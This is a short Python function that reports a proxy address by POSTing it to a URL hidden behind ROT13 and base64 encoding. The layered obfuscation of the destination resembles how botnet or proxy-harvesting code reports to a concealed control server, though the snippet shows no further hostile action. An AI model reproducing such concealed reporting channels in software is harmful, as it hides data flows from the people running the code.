import base64,codecs,requests;

def sync_report_proxy(report_url,proxy):
  proxy_json={'ask':'give','proxy':proxy};
  request=requests.post(base64.urlsafe_b64decode(codecs.decode(report_url, 'rot13')).decode(),proxy_json);
  request.raise_for_status();
  return request;
